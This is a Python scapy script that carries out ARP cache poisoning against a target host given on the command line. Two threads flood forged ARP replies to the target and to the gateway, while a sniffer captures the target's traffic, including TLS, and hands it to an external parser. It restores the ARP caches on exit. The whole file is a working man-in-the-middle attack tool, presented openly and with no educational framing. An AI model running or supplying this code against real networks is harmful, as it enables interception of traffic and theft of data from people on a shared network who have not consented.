#!/usr/bin/env python3

from scapy.all import *
import time
import netifaces as ni
import sys
import threading
from importlib import *
import parser
import signal

spoofing = False
packets = []

class Spoof(threading.Thread):
    def __init__(self, ip, own):
        super(Spoof, self).__init__()
        self.ip = ip
        self.own = own

    def run(self):
        pkt = ARP()
        pkt.pdst  = self.ip
        pkt.hwsrc = self.own['mac']
        pkt.psrc  = self.own['gw']
        pkt.hwdst = "ff:ff:ff:ff:ff:ff"
        pkt.op = 2
        global spoofing
        while spoofing:
            send(pkt, verbose=False)

class SpoofRouter(threading.Thread):
    def __init__(self, ip, own):
        super(SpoofRouter, self).__init__()
        self.ip = ip
        self.own = own

    def run(self):
        pkt = ARP()
        pkt.pdst  = self.own['gw']
        pkt.hwsrc = self.own['mac']
        pkt.psrc  = self.ip
        pkt.hwdst = self.own['gw_mac']
        pkt.op = 2
        global spoofing
        while spoofing:
            send(pkt, verbose=False)

class Sniff(threading.Thread):
    snifft = None
    def __init__(self, target):
        super(Sniff, self).__init__()
        self.target = target
        load_layer("tls")
        self.snifft = AsyncSniffer(filter="host {}".format(self.target), prn=packet_handler)

def packet_handler(packet):
    try:
        #reload(parser)
        parser.parse(packet)
    except Exception as e:
        print("parser exception: {}", str(e))

def get_interface_ip_mac():
    try:
        iface = ni.gateways()['default'][ni.AF_INET][1]
        addr  = ni.ifaddresses(iface)[ni.AF_INET][0]['addr']
        mac   = ni.ifaddresses(iface)[ni.AF_LINK][0]['addr']
        gw    = ni.gateways()[ni.AF_INET][0][0]
        gw_mac = get_ip_mac(gw)
        own   = { 'iface': iface, 'addr': addr, 'mac': mac, 'gw': gw, 'gw_mac': gw_mac }
        return own
    except:
        ifaces = []
        for iface in ni.interfaces():
            ipv4s = ni.ifaddresses(iface).get(ni.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo' or addr.startswith('127.'))):
                    ifaces.append(iface)
        iface = ifaces[0]
        addr  = ni.ifaddresses(iface)[ni.AF_INET][0]['addr']
        mac   = ni.ifaddresses(iface)[ni.AF_LINK][0]['addr']
        gw    = ni.gateways()[ni.AF_INET][0][0]
        gw_mac = get_ip_mac(gw)
        own   = { 'iface': iface, 'addr': addr, 'mac': mac, 'gw': gw, 'gw_mac': gw_mac }
        return own

def get_ip_mac(ip):
    pkt = ARP(pdst = ip, hwdst = "ff:ff:ff:ff:ff:ff")
    res, err = sr(pkt, verbose=False, retry=5)
    if len(res) > 0:
        mac = res[0][1].hwsrc
        return mac
    else:
        return None

def restore(target, target_mac, own):
    global spoofing
    spoofing = False
    time.sleep(5)
    pkt = ARP()
    pkt.pdst = own['gw']
    pkt.hwsrc = target_mac
    pkt.psrc = target
    pkt.hwdst = own['gw_mac']
    pkt.op = 2
    send(pkt, inter=0.5, count=5, verbose=False)

    pkt = ARP()
    pkt.pdst = target
    pkt.hwsrc = own['gw_mac']
    pkt.psrc = own['gw']
    pkt.hwdst = get_ip_mac(target)
    pkt.op = 2
    send(pkt, inter=0.5, count=5, verbose=False)

def main():
    global spoofing
    global t
    target = sys.argv[1]
    t = target
    own = get_interface_ip_mac()

    print("Starting capturing on {}".format(own['iface']))
    print("Gateway found: {} - [{}]".format(own['gw'], own['gw_mac']))
    target_mac = get_ip_mac(target)
    print("Target: {} - [{}]".format(target, target_mac))
    sniffer = Sniff(target)
    def signal_handler(sig, frame):
        print("Restoring arp cache")
        sniffer.snifft.stop()
        restore(target, target_mac, own)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    try:
        spoofing = True
        sys.stdout.flush()
        print("starting arp poisoning {}".format(target))
        tg = {}
        spoof = Spoof(target, own)
        spoofgw = SpoofRouter(target, own)
        spoof.start()
        spoofgw.start()
        sniffer.snifft.start()
    except Exception as e:
        print("Exception: {}".format(str(e)))

main()
